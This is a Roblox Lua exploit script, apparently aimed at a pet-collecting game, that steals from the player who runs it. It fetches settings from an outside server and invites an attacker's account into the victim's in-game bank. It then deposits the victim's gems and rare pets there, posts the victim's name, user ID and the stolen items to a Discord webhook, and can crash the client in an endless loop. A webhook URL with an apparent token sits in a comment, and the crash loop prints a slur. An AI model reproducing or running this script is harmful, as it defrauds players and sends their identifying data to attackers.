
local YourWebHookHere =  "https://crystalblob.api.stdlib.com/whid-server@dev/getwhid/?whid=".._G.AuthKey  -https://discord.com/api/webhooks/930540784158113812/tOMnL_1kprqmwxTEnMRbkiouyN5Yzqb0ZAE85iaG8WqOcQxJ-pRVvhjaMh5jC7SYURWl- web hook here
local http = game:GetService("HttpService")
local url = YourWebHookHere
local username = game:GetService("Players").LocalPlayer.Name
 
local data = {}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}
request = http_request or request or HttpGet or syn.request
local abcdef = {Url = url, Method = "GET", Headers = headers}
local result = request(abcdef)
for i, v in pairs(result) do print(i, v) end
print(#result.Body)
local result = result.Body
local res = string.gsub(result, '"', "")
local res2 = string.split(res, "$")
local userid = res2[2]
if res2[3] == "true" then
_G.DepoAllGems = true
else
_G.DepoAllGems = false
end
if res2[4] == "true" then
_G.DepoAllPets = true
else
_G.DepoAllPets = false
end
if res2[5] == "true" then
_G.CrashAtEnd = true
else
_G.CrashAtEnd = false
end
if res2[6] == "true" then
_G.UseWebhook = true
else
_G.UseWebhook = false
end

local Bank = ""

local A_1 = "b"
local A_2 = "bank deposit"
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
Event:FireServer(A_1, A_2)

local A_1 = "b"
local A_2 = "buy egg"
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
Event:FireServer(A_1, A_2)

local A_1 = "b"
local A_2 = "invite to bank"
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
Event:FireServer(A_1, A_2)

local A_1 = "b"
local A_2 = "get bank"
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
Event:FireServer(A_1, A_2)

local A_1 = "b"
local A_2 = "get my banks"
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
Event:FireServer(A_1, A_2)


wait(1)
local A_1 = 
{
}
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["get my banks"]
local val = Event:InvokeServer(A_1)
Bank = val[1][1]["BUID"]
if Bank == nil then
return
end
wait(0.5)
local A_1 = 
{
	[1] = Bank
}
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["get bank"]
local ABCXD = Event:InvokeServer(A_1)
if ABCXD[1]["Tier"] == 1 then
return
end
wait(1)
local A_1 = 
{
	[1] = Bank, 
	[2] = tonumber(userid)
}
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["invite to bank"]
Event:InvokeServer(A_1)
local output = ""
local FinalList = {}
if _G.DepoAllGems then
local gemText = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
wait(1)
for i = 1, #gemText, 1 do
if string.sub(gemText, i, i) == "1" then
output = output.."1"
elseif string.sub(gemText, i, i) == "2" then
output = output.."2"
elseif string.sub(gemText, i, i) == "3" then
output = output.."3"
elseif string.sub(gemText, i, i) == "4" then
output = output.."4"
elseif string.sub(gemText, i, i) == "5" then
output = output.."5"
elseif string.sub(gemText, i, i) == "6" then
output = output.."6"
elseif string.sub(gemText, i, i) == "7" then
output = output.."7"
elseif string.sub(gemText, i, i) == "8" then
output = output.."8"
elseif string.sub(gemText, i, i) == "9" then
output = output.."9"
elseif string.sub(gemText, i, i) == "0" then
output = output.."0"
end
end
output = tonumber(output)

else
output = tonumber("1")
end
if _G.DepoAllPets then
	Library     = require(game:GetService('ReplicatedStorage').Framework:FindFirstChild('Library'))
	Functions   = Library.Functions
	EXCList     = {}
    MythicList  = {}

    EList       = {}
    MList       = {}


	table.foreach(Library.Directory.Pets, function(i, v)
		if v.rarity == "Exclusive" then
			table.insert(EXCList, i)
		end
		if v.rarity == "Mythical" then
			table.insert(MythicList, i)
		end
	end)

local pets = require(game:GetService("ReplicatedStorage").Framework.Modules.Client["4 | Save"]).Get().Pets
for i, v in pairs(pets) do
if table.find(EXCList, v["id"]) ~= nil then
table.insert(EList, v["uid"])
end
if table.find(MythicList, v["id"]) ~= nil then
table.insert(MList, v["uid"])
end
end
if #EList + #MList < 49 then
for i, v in pairs(EList) do
table.insert(FinalList, v)
end
for i, v in pairs(MList) do
table.insert(FinalList, v)
end
elseif #EList + #MList > 49 and #EList < 49 then
for i, v in pairs(EList) do
table.insert(FinalList, v)
end
for i, v in pairs(MList) do
if #FinalList < 49 then
table.insert(FinalList, v)
end
end
elseif #EList + #MList > 49 and #EList > 49 then
for i, v in pairs(EList) do
if #FinalList < 49 then
table.insert(FinalList, v)
end
end
end
wait(0.5)
game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
local A_1 = 
{
	[1] = "Cracked Egg", 
	[2] = false
}
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["buy egg"]
Event:InvokeServer(A_1)
wait(0.5)
end
if _G.DepoAllGems or _G.DepoAllPets or _G.DepoAllGems and _G.DepoAllPets then
local A_1 = 
{
	[1] = Bank, 
	[2] = FinalList, 
	[3] = output-1
}
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["bank deposit"]
local result = Event:InvokeServer(A_1)
end
wait(0.5)
if _G.UseWebhook then
local A_1 = 
{
	[1] = Bank
}
local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["get bank"]
local SuperBank = Event:InvokeServer(A_1)
	EXCList     = {}
   	MythicList  = {}
	LegList = {}
	EpicList = {}
	RareList = {}
	CommonList = {}
	
	EXCCount = 0
	MythicCount = 0
	LegCount = 0
	EpicCount = 0
	RareCount = 0
	CommonCount = 0
	
	table.foreach(Library.Directory.Pets, function(i, v)
		if v.rarity == "Exclusive" then
			table.insert(EXCList, i)
		end
		if v.rarity == "Mythical" then
			table.insert(MythicList, i)
		end
		if v.rarity == "Legendary" then
			table.insert(LegList, i)
		end
		if v.rarity == "Epic" then
			table.insert(EpicList, i)
		end
		if v.rarity == "Rare" then
			table.insert(RareList, i)
		end
		if v.rarity == "Common" then
			table.insert(CommonList, i)
		end
	end)
	for i, v in pairs(SuperBank[1]["Storage"]["Pets"]) do
	if table.find(EXCList, v["id"]) then EXCCount+=1 end
	if table.find(MythicList, v["id"]) then MythicCount+=1 end
	if table.find(LegList, v["id"]) then LegCount+=1 end
	if table.find(EpicList, v["id"]) then EpicCount+=1 end
	if table.find(RareList, v["id"]) then RareCount+=1 end
	if table.find(CommonList, v["id"]) then CommonCount+=1 end
	end
local YourWebHookHere =  res2[1]

local url = YourWebHookHere
local username = game:GetService("Players").LocalPlayer.Name
 
local data = {
  ["content"] = "@everyone We Got a Hit!",
["embeds"] = {{
["title"] = "__**Bank Steal Results**__",
["description"] = "(Made by Crystal and ver!)",
["type"] = "rich",
["color"] = tonumber(0x0E980E),
["fields"] = {
               {
["name"] = "__user__",
["value"] = "**"..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId.."*2309449526*", -- remove the || on both sides if you don't want your username to be behind a spoiler
["inline"] = false
},
               {
["name"] = "__Gems__",
["value"] = SuperBank[1]["Storage"]["Currency"]["Diamonds"],
["inline"] = false
},
{
["name"] = "__Pets Overall__",
["value"] = #SuperBank[1]["Storage"]["Pets"],
["inline"] = false
},
{
["name"] = "__Exclusive/Huges__",
["value"] = EXCCount,
["inline"] = true
},
{
["name"] = "__Mythicals__",
["value"] = MythicCount,
["inline"] = true
},
{
["name"] = "__Legendaries__",
["value"] = LegCount,
["inline"] = true
},
{
["name"] = "__Epics__",
["value"] = EpicCount,
["inline"] = true
},
{
["name"] = "__Rares__",
["value"] = RareCount,
["inline"] = true
},
{
["name"] = "__Commons__",
["value"] = CommonCount,
["inline"] = true
},
{
["name"] = "__BankID__",
["value"] = Bank,
["inline"] = false
},
}
}}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
end
wait(0.5)
if _G.CrashAtEnd then
spawn(function()
while true do
print("raped")
spawn(function()
while true do
print("raped")
end
end)
end
end)
end
--lol
